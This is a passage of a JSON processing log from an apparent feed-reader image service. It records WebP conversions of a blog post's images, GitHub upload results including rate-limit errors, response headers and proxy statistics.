X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, X-GitHub-SSO, X-GitHub-Request-Id, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Mon, 14 Mar 2022 10:35:44 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["D044:13D74:C43BB9C:C718C26:622F1A80"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1647256480"],"x-ratelimit-resource":["core"],"x-ratelimit-used":["61"],"x-xss-protection":["0"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx31/cdn38/contents/2022/03/14/10-35-44-308_aad46fb3510c6909.webp","historyStatusCode":[],"spendMs":238},"base64UserPassword":null,"token":"da243******************************d9e47"},"githubUser":"myreaderx31","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"69.7 KB","destSize":"90.8 KB","compressRate":"130.2%"},null,{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712170908.png","sourceStatusCode":200,"destWidth":1920,"destHeight":1017,"sourceBytes":161282,"destBytes":86648,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":2158,"convertSpendMs":89,"createdTime":"2022-03-14 18:36:39","host":"us-027*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn92/contents/2022/03/14/10-36-42-077_a6f75c2ee4554302.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, X-GitHub-SSO, X-GitHub-Request-Id, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Mon, 14 Mar 2022 10:36:42 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["D38E:7F74:BD5C24B:15FCFC8B:622F1ABA"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1647256474"],"x-ratelimit-resource":["core"],"x-ratelimit-used":["60"],"x-xss-protection":["0"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn92/contents/2022/03/14/10-36-42-077_a6f75c2ee4554302.webp","historyStatusCode":[],"spendMs":41},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"157.5 KB","destSize":"84.6 KB","compressRate":"53.7%"}],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-032.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-039.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe61.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe66.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-015.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-022.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-026.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-23.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-54.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-57.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-010.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-003.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-027.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712164644.png","sourceStatusCode":200,"destWidth":1263,"destHeight":389,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn86@2020_1/2022/03/14/10-35-38-330_0e0bfe13ba5fd394.webp","sourceBytes":20501,"destBytes":13498,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":2403,"convertSpendMs":51,"createdTime":"2022-03-14 18:35:36","host":"us-007*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f,409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20 KB","destSize":"13.2 KB","compressRate":"65.8%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712155201.png","sourceStatusCode":200,"destWidth":905,"destHeight":251,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn12@2020_3/2022/03/14/10-35-40-484_723d94ac9fad8d11.webp","sourceBytes":26381,"destBytes":40804,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":2161,"convertSpendMs":44,"createdTime":"2022-03-14 18:35:38","host":"europe61*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"25.8 KB","destSize":"39.8 KB","compressRate":"154.7%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712155342.png","sourceStatusCode":200,"destWidth":1920,"destHeight":1034,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn19@2020_3/2022/03/14/10-35-40-947_25f8792c18b6cffd.webp","sourceBytes":134567,"destBytes":180388,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":2565,"convertSpendMs":103,"createdTime":"2022-03-14 18:35:38","host":"us-026*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"131.4 KB","destSize":"176.2 KB","compressRate":"134.1%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712152849.png","sourceStatusCode":200,"destWidth":1920,"destHeight":578,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn26@2020_3/2022/03/14/10-35-41-017_76ee5e19e147c37e.webp","sourceBytes":71915,"destBytes":97272,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":2645,"convertSpendMs":43,"createdTime":"2022-03-14 18:35:38","host":"us-015*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"70.2 KB","destSize":"95 KB","compressRate":"135.3%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210713162517.png","sourceStatusCode":200,"destWidth":1285,"destHeight":849,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn29@2020_1/2022/03/14/10-35-41-007_c0f697ae4a827df8.webp","sourceBytes":88203,"destBytes":92352,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":2695,"convertSpendMs":70,"createdTime":"2022-03-14 18:35:38","host":"us-003*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"86.1 KB","destSize":"90.2 KB","compressRate":"104.7%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712165007.png","sourceStatusCode":200,"destWidth":1287,"destHeight":327,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn100@2020_1/2022/03/14/10-35-41-041_8009b5ab3ffd5826.webp","sourceBytes":83448,"destBytes":15012,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":2791,"convertSpendMs":33,"createdTime":"2022-03-14 18:35:38","host":"us-022*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"81.5 KB","destSize":"14.7 KB","compressRate":"18%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712165241.png","sourceStatusCode":200,"destWidth":1242,"destHeight":398,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn34@2020_2/2022/03/14/10-35-41-303_f52859bc551c13f5.webp","sourceBytes":16501,"destBytes":18644,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":2990,"convertSpendMs":20,"createdTime":"2022-03-14 18:35:38","host":"europe66*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"16.1 KB","destSize":"18.2 KB","compressRate":"113%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712153744.png","sourceStatusCode":200,"destWidth":1115,"destHeight":136,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn16@2020_6/2022/03/14/10-35-41-504_b565567ffbec502c.webp","sourceBytes":14262,"destBytes":18802,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":3149,"convertSpendMs":10,"createdTime":"2022-03-14 18:35:38","host":"us-039*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"13.9 KB","destSize":"18.4 KB","compressRate":"131.8%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712171854.png","sourceStatusCode":200,"destWidth":1049,"destHeight":218,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn8@2020_3/2022/03/14/10-35-41-466_0531a9e24ff79c7c.webp","sourceBytes":15318,"destBytes":19774,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":3100,"convertSpendMs":13,"createdTime":"2022-03-14 18:35:38","host":"europe-23*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"15 KB","destSize":"19.3 KB","compressRate":"129.1%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712154430.png","sourceStatusCode":200,"destWidth":950,"destHeight":89,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn41@2020_5/2022/03/14/10-35-41-853_e79bced238db345e.webp","sourceBytes":16569,"destBytes":18524,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":3589,"convertSpendMs":7,"createdTime":"2022-03-14 18:35:38","host":"us-032*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"16.2 KB","destSize":"18.1 KB","compressRate":"111.8%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712171324.png","sourceStatusCode":200,"destWidth":735,"destHeight":179,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn90@2020_3/2022/03/14/10-35-42-691_dc94e1fe5d9ad0d9.webp","sourceBytes":21460,"destBytes":15110,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":4340,"convertSpendMs":7,"createdTime":"2022-03-14 18:35:38","host":"us-027*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"21 KB","destSize":"14.8 KB","compressRate":"70.4%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712193241.png","sourceStatusCode":200,"destWidth":1920,"destHeight":1018,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn95@2020_5/2022/03/14/10-35-43-214_66d0afd231e2c44c.webp","sourceBytes":211650,"destBytes":308302,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":4956,"convertSpendMs":675,"createdTime":"2022-03-14 18:35:38","host":"us-035*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"206.7 KB","destSize":"301.1 KB","compressRate":"145.7%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712153642.png","sourceStatusCode":200,"destWidth":1528,"destHeight":902,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn3@2020_4/2022/03/14/10-35-44-482_6ae6730984506252.webp","sourceBytes":102392,"destBytes":124440,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":6120,"convertSpendMs":77,"createdTime":"2022-03-14 18:35:38","host":"us-010*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"100 KB","destSize":"121.5 KB","compressRate":"121.5%"}],"successGithubMap":{"myreaderx8":1,"myreaderx27":1,"myreaderx4":1,"myreaderx10":1,"myreaderx12":1,"myreaderx2":1,"myreaderx13":1,"myreaderx24":1,"myreaderx1":1,"myreaderx30":1,"myreaderx29":1,"myreaderx18":1,"myreaderx":1},"failGithubMap":{"myreaderx23":1,"myreaderx31":1}}